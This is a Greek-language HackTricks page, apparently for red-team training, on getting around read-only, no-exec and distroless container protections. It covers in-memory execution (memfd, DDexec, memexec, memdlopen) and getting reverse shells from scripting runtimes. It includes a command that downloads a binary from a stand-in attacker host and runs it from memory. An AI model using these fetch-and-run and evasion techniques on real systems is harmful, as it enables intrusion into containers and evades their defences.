# Παράκαμψη προστασιών FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Βίντεο

Στα ακόλουθα βίντεο θα βρείτε τις τεχνικές που αναφέρονται σε αυτή τη σελίδα, εξηγημένες πιο αναλυτικά:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## σενάριο read-only / no-exec

Είναι όλο και πιο συνηθισμένο να βρίσκουμε linux machines προσαρτημένα με **read-only (ro) file system protection**, ιδιαίτερα σε containers. Αυτό συμβαίνει επειδή η εκτέλεση ενός container με ro file system είναι τόσο απλή όσο ο ορισμός του **`readOnlyRootFilesystem: true`** στο `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ωστόσο, ακόμη και αν το file system είναι προσαρτημένο ως ro, το **`/dev/shm`** θα παραμένει εγγράψιμο, επομένως είναι λανθασμένο να θεωρούμε ότι δεν μπορούμε να γράψουμε τίποτα στον δίσκο. Παρ' όλα αυτά, αυτός ο φάκελος θα είναι **mounted με no-exec protection**, οπότε αν κάνετε download ένα binary εδώ, **δεν θα μπορείτε να το εκτελέσετε**.

> [!WARNING]
> Από την οπτική του red team, αυτό καθιστά **περίπλοκο το download και την εκτέλεση** binaries που δεν υπάρχουν ήδη στο σύστημα (όπως backdoors ή enumerators όπως το `kubectl`).

## Ευκολότερη παράκαμψη: Scripts

Σημειώστε ότι ανέφερα binaries· μπορείτε να **εκτελέσετε οποιοδήποτε script**, αρκεί ο interpreter να υπάρχει στο machine, όπως ένα **shell script** αν υπάρχει το `sh` ή ένα **python** **script** αν είναι εγκατεστημένο το **python**.

Ωστόσο, αυτό από μόνο του δεν αρκεί για να εκτελέσετε το binary backdoor ή άλλα binary tools που ενδέχεται να χρειαστεί να εκτελέσετε.

## Παρακάμψεις μέσω μνήμης

Αν θέλετε να εκτελέσετε ένα binary αλλά το file system δεν το επιτρέπει, ο καλύτερος τρόπος είναι να το **εκτελέσετε από τη μνήμη**, καθώς οι **προστασίες δεν ισχύουν εκεί**.

### Παράκαμψη FD + exec syscall

Αν υπάρχουν μέσα στο machine ισχυροί script engines, όπως **Python**, **Perl** ή **Ruby**, μπορείτε να κάνετε download το binary που θέλετε να εκτελέσετε στη μνήμη, να το αποθηκεύσετε σε έναν memory file descriptor (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες, και στη συνέχεια να καλέσετε ένα **`exec` syscall**, υποδεικνύοντας το **fd ως το αρχείο προς εκτέλεση**.

Για αυτό μπορείτε εύκολα να χρησιμοποιήσετε το project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Μπορείτε να του δώσετε ένα binary και θα δημιουργήσει ένα script στη συγκεκριμένη γλώσσα, με το **binary συμπιεσμένο και κωδικοποιημένο σε b64**, μαζί με τις οδηγίες για την **αποκωδικοποίηση και αποσυμπίεσή του** σε ένα **fd**, το οποίο δημιουργείται μέσω κλήσης του `create_memfd` syscall, καθώς και μια κλήση στο **exec** syscall για την εκτέλεσή του.

> [!WARNING]
> Αυτό δεν λειτουργεί σε άλλες scripting languages, όπως PHP ή Node, επειδή δεν διαθέτουν **προεπιλεγμένο τρόπο κλήσης raw syscalls** από ένα script, επομένως δεν είναι δυνατή η κλήση του `create_memfd` για τη δημιουργία του **memory fd** όπου θα αποθηκευτεί το binary.
>
> Επιπλέον, η δημιουργία ενός **regular fd** με ένα αρχείο στο `/dev/shm` δεν θα λειτουργήσει, καθώς δεν θα επιτρέπεται η εκτέλεσή του λόγω εφαρμογής του **no-exec protection**.

### DDexec / EverythingExec

Το [**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σας επιτρέπει να **τροποποιήσετε τη μνήμη της δικής σας process**, κάνοντας overwrite στο **`/proc/self/mem`**.

Επομένως, ελέγχοντας τον assembly code που εκτελείται από τη process, μπορείτε να γράψετε ένα **shellcode** και να «μεταλλάξετε» τη process ώστε να **εκτελέσει οποιονδήποτε arbitrary code**.

> [!TIP]
> Το **DDexec / EverythingExec** σας επιτρέπει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε binary** από τη **μνήμη**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε το Github ή:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

Το [**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode που εκτελείται ως daemon**, επομένως κάθε φορά που θέλετε να **εκτελέσετε διαφορετικό binary** δεν χρειάζεται να επανεκκινήσετε το DDexec· μπορείτε απλώς να εκτελέσετε το memexec shellcode μέσω της τεχνικής DDexec και στη συνέχεια να **επικοινωνήσετε με αυτό το daemon για να του περάσετε νέα binaries προς φόρτωση και εκτέλεση**.

Μπορείτε να βρείτε ένα παράδειγμα χρήσης του **memexec για την εκτέλεση binaries από ένα PHP reverse shell** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) παρέχει έναν **ευκολότερο τρόπο φόρτωσης binaries** στη μνήμη, ώστε να εκτελεστούν αργότερα. Θα μπορούσε ακόμη και να επιτρέψει τη φόρτωση binaries με dependencies.

## Distroless Bypass

Για μια ειδική εξήγηση σχετικά με το **τι είναι στην πραγματικότητα το distroless**, πότε βοηθά, πότε όχι και πώς αλλάζει το post-exploitation tradecraft στα containers, δείτε:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Τι είναι το distroless

Τα distroless containers περιέχουν μόνο τα **απολύτως απαραίτητα components για την εκτέλεση μιας συγκεκριμένης εφαρμογής ή υπηρεσίας**, όπως libraries και runtime dependencies, αλλά εξαιρούν μεγαλύτερα components όπως package manager, shell ή system utilities.

Ο στόχος των distroless containers είναι η **μείωση του attack surface των containers με την εξάλειψη περιττών components** και την ελαχιστοποίηση του αριθμού των vulnerabilities που μπορούν να γίνουν exploit.

### Reverse Shell

Σε ένα distroless container μπορεί να **μη βρείτε καν `sh` ή `bash`** για να αποκτήσετε ένα κανονικό shell. Επίσης δεν θα βρείτε binaries όπως `ls`, `whoami`, `id`... ούτε οτιδήποτε άλλο εκτελείτε συνήθως σε ένα system.

> [!WARNING]
> Επομένως, **δεν θα μπορείτε** να αποκτήσετε ένα **reverse shell** ή να κάνετε **enumerate** το system όπως συνήθως.

Ωστόσο, αν το compromised container εκτελεί, για παράδειγμα, ένα flask web application, τότε είναι εγκατεστημένη η Python και επομένως μπορείτε να αποκτήσετε ένα **Python reverse shell**. Αν εκτελεί Node, μπορείτε να αποκτήσετε ένα Node rev shell, και το ίδιο ισχύει για σχεδόν οποιαδήποτε **scripting language**.

> [!TIP]
> Χρησιμοποιώντας τη scripting language, μπορείτε να κάνετε **enumerate το system** μέσω των δυνατοτήτων της γλώσσας.

Αν δεν υπάρχουν **`read-only/no-exec`** protections, θα μπορούσατε να κάνετε abuse του reverse shell σας για να **γράψετε τα binaries σας στο file system** και να τα **εκτελέσετε**.

> [!TIP]
> Ωστόσο, σε αυτού του είδους τα containers αυτές οι protections συνήθως υπάρχουν, αλλά θα μπορούσατε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές memory execution για να τις παρακάμψετε**.

Μπορείτε να βρείτε **παραδείγματα** για το πώς να **εκμεταλλευτείτε ορισμένα RCE vulnerabilities** ώστε να αποκτήσετε **reverse shells από scripting languages** και να εκτελέσετε binaries από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## References

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
